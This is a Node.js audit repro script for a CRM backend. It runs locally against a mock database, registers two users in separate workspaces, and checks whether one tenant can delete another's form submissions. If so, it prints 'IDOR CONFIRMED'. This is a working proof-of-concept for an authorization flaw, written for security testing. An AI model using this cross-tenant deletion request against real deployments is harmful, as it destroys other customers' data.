// Portable repro (audit 2026-09-03). Run from anywhere: node nexuscrm/audit/repro/idor_verify.mjs
import { fileURLToPath, pathToFileURL } from 'node:url';
const ROOT = fileURLToPath(new URL('../../', import.meta.url));
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const { init, DB } = require((ROOT+'tests/d1mock.js'));
await init(readFileSync((ROOT+'backend/schema.sql'),'utf8'));
const worker = (await import(pathToFileURL(ROOT+'backend/src/index.js').href)).default;
const env = { DB, API_IP_RATE_MAX: 1e9, API_TOKEN_RATE_MAX: 1e9 }; const ctx = { waitUntil: (p) => Promise.resolve(p).catch(()=>{}) }; const BASE='http://test.local';
globalThis.fetch = async () => new Response(JSON.stringify({choices:[{message:{content:'ok'}}]}),{status:200,headers:{'Content-Type':'application/json'}});
async function call(method, path, body, token){ const h={'Content-Type':'application/json',Origin:'http://app.local'}; if(token) h.Authorization='Bearer '+token; const r=await worker.fetch(new Request(BASE+'/api'+path,{method,headers:h,body:body?JSON.stringify(body):undefined}),env,ctx); return {status:r.status,data:await r.json().catch(()=>null)}; }
const A = (await call('POST','/auth/register',{name:'A',email:'a@x.com',password:'password123',workspace_name:'WA'})).data.token;
const B = (await call('POST','/auth/register',{name:'B',email:'b@x.com',password:'password123',workspace_name:'WB'})).data.token;
// GET-by-id support check (A on own records) BEFORE any B action
const mk = { deals: {title:'D1', value: 100}, tasks: {title:'T1'}, workflows: {name:'W', trigger:'new_contact', steps:[]}, forms: {name:'F', fields:[{name:'email',type:'email'}]} };
const ids={}; for (const [root, body] of Object.entries(mk)) { const r = await call('POST','/'+root, body, A); ids[root]=r.data.id; }
const own = {}; for (const [root,id] of Object.entries(ids)) own[root] = (await call('GET', `/${root}/${id}`, null, A)).status;
console.log('A GET own record by id (before B touches anything):', JSON.stringify(own), '→ 404 here means the route simply has no GET-by-id (not a deletion)');
// Form submissions IDOR: A's form gets a public submission; B wipes it
const f = (await call('GET','/forms',null,A)).data.forms.find(x=>x.id===ids.forms);
const sub = await worker.fetch(new Request(`${BASE}/api/public/forms/${f.slug}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'lead@x.com', name:'Lead'})}),env,ctx);
const before = (await call('GET',`/forms/${ids.forms}/submissions`,null,A));
const wipe = await call('DELETE',`/forms/${ids.forms}/submissions`,null,B);
const after = (await call('GET',`/forms/${ids.forms}/submissions`,null,A));
console.log(`forms: public submit=${sub.status}; A submissions before=${(before.data?.submissions||[]).length}; B DELETE → ${wipe.status} ${JSON.stringify(wipe.data)}; A submissions after=${(after.data?.submissions||[]).length} → ${(after.data?.submissions||[]).length===0 && (before.data?.submissions||[]).length>0 ? '❌ IDOR CONFIRMED (B deleted A\'s form submissions)' : 'n/a'}`);
process.exit(0);
